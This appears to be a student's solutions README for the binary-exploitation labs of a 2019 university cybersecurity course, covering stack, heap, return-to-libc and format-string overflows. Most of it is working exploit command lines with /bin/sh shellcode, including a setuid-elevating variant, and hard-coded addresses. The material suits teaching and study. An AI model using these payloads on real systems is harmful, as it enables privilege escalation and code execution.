# Emory Fall 2019: CS453: Cybersecurity

The labs are on platform.adversary.io. They consisted of binary bombs, web exploit exercises, and binary exploits.
This folder only contains the binary exploit puzzles and their solutions.

## Overflow 1

Solution:  
./overflow aaaabbbbccccdddd$(perl -e 'print "\x48\x43\x4b\x52"')  
Pretty standard overflow: just had to input the location for secret after filling up the buffer.


## Overflow 2

Solution:  
./overflow2 $(perl -e 'print "\x90" x (256-40)')$(perl -e 'print "\xeb\x18\x5b\xb8\xf5\xff\xff\xff\xf7\xd8\x31\xd2\x88\x53\x07\x89\x5b\x08\x89\x53\x0c\x8d\x4b\x08\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x43\x43" ')AAAAAAAAAAAA$(perl -e 'print "\xe8\xd4\xff\xff"')  
The idea is to fill up the buffer, leaving 40 bytes of room for the shellcode. Then, overwrite the ebp, and return into the buffer. Some extra padding was used for stack alignment. 

## Chained Overflow
Solution:  
echo $(perl -e 'printf "\x11" x 4')$(perl -e 'print "\x90" x 3812')$(perl -e 'print "\x90" x (256-55)')$(printf "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xeb\x18\x5b\xb8\xf5\xff\xff\xff\xf7\xd8\x31\xd2\x88\x53\x07\x89\x5b\x08\x89\x53\x0c\x8d\x4b\x08\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x43\x45")$(printf "\x97\x6c\x6c\xe8\xd4\xff\xff") > temp.hex  
cat temp.hex - | ./overflow RUSHKEKEKE$(perl -e 'printf "\x2e"x9')$(printf "\x34\xa9\x87\x04\x08")
This was a tedious one.  
- Step 1: Bypass the first comparison by filling it with hex characters such that the first 10 characters spell RUSHKEKEKE and the sum of the hex representation of RUSHKEKEKE and the subsequent 14 characters divide 256. 
- Step 2: Edit the shellcode so that it runs setuid (getuid, getuid), otherwise the shell won't spawn with privileges (I realized this in hindsight after spawning a useless shell).
- Step 3: The size of the buffer is not show in the code, so I had to use gdb to find the size of the buffer which turned out to be 4068. Fill the buffer with the shellcode and some extra padding to also make sure that the sum of the hex characters in the buffer is divisible by 256. 
- Step 4: Hold the door open by piping in the shellcode + nopsled with '-' so that the keyboard remains interactive and end of input is not reached. If end of input is reached, shell instantly closes. 

## Heap Overflow 1
Solution:  
./heap-arbitrary-overwrite $(perl -e 'printf "A" x 40')$(printf "\x9c\xcf\x0e\x08") $(perl -e 'printf "\x44\x33\x22\x11"')$(perl -e 'printf"B" x 32')  

## Heap Overflow 2
Solution:  
./heap-hijack-funcptr $(perl -e 'printf "A" x 72')$(printf '\xdf\x89\x04\x08')  
V simple; the size of the allocated space was 64 + 8 bytes, and overflow the next pointer to return into the shell 

## Return to libc
Solution:  
./overflow $(perl -e 'print "AAAA"x764')AAAA$(printf "ABCDD\xa6\x85\x04\x08")$(printf "\x40\x6b\xe4\xf7")AAAA$(printf "\xc8\x8d\xf6\xf7")  
The idea behind the attack is that because the stack is nonexecutable, you have to return to places in memory that are executable. 


## Format String
Solution:  
./format $(perl -e 'print "\x41\xc0\xd2\xff\xff\xc1\xd2\xff\xff\xc2\xd2\xff\xff\xc3\xd2\xff\xff"')%$[0xfb-0x20]u%10\$n%$[0x184-0xfb]u%11\$n%$[0x204-0x184]u%12\$n%$[0x308-0x204]u%13\$n%271\$p.%272\$p.%273\$p.%274\$p.%275\$p  
Inject shellcode and then point to it by manipulating format strings

